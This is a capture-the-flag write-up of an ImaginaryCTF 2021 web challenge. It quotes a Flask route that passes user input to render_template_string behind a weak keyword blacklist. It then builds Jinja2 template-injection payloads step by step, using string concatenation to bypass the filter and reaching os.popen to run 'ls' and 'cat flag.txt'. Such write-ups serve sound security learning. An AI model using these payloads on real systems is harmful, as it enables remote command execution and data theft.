# ImaginaryCTF 2021
After reviewing the python file, we can figure out the application is using function "render_template_string" which is vulnerable to SSTI. This function takes user input without any sanitizing.
```@app.route('/site')
def site():
  content = b64decode(request.args['content']).decode()
  #prevent xss
  blacklist = ['script', 'iframe', 'cookie', 'document', "las", "bas", "bal", ":roocursion:"] # no roocursion allowed
  for word in blacklist:
    if word in content:
      # this should scare them away
      content = "*** stack smashing detected ***: python3 terminated"
  csp = '''<head>\n<meta http-equiv="Content-Security-Policy" content="default-src 'none'">\n</head>\n'''
  return render_template_string(csp + content)
  ```
  **render_template_string(csp + content)**
  
  So the next step we need to call the necessary functions from dictionary-like object. The first step is to trigger one Object. Notice the 'las' and 'bas', 'bal' are blacklisted, so we need to bypass the control through concatenating the strings. Here is the payload I used.

**{{request["__cl"+"ass__"]["__mro__"]}}**

<pic.1>
The request here is a variable created before. We can also use other objects like [] '' or {}... The main point here is to get Object Class from Python.

Then we choose the index 3 in the tuple and we get an Object class:
{{request["__cl"+"ass__"]["__mro__"][3]}}
<pic.2>
The next steps are about to see all used classes, we can achive that through calling 'subclasses'.
{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()}}
<pic.3>
Notice we got quite a lot of classes. We need to choose the exploitable ones. For instance os._wrap_close. We can also use other classes and the resources are easy to find on Internet :) The class here can be called via : "os._wrap_close.__init__.__globals__['popen']('INPUT YOUR LINUX COMMAND HERE').read()" Then we have the payload as following:
{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()[132]['__init__']['__glob'+'als__']['popen']('ls').read()}}

Upon executing the ls command, we can see the files in current path:
<pic.4>
And we are able to see the content of the 'flag.txt' through command cat. Here is the final payload we used:
{{request["__cl"+"ass__"]["__mro__"][3]["__subcl"+"asses__"]()[132]['__init__']['__glob'+'als__']['popen']('cat flag.txt').read()}}
<pic.5>
And BINGO, we got the flag:

ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}
